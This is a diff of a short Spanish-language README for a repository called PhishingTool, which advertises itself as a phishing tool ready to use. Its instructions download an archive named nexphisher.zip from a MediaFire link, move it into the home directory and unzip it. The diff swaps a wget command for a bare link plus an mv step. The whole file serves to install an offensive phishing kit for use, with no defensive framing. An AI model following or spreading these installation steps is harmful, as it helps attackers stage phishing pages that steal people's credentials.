@@ -1,7 +1,11 @@
 # PhishingTool
 HERRAMIENTA DE PHISHING LISTA PARÁ USARSE
 # INSTRUCCIONES
-wget https://www.mediafire.com/file/s8l9ye0k8b73x2q/nexphisher.zip/file
+
+ https://www.mediafire.com/file/s8l9ye0k8b73x2q/nexphisher.zip/file
+
+mv $HOME/storage/downloads/nexphisher.zip $HOME/
+
 
 unzip nexphisher.zip
 
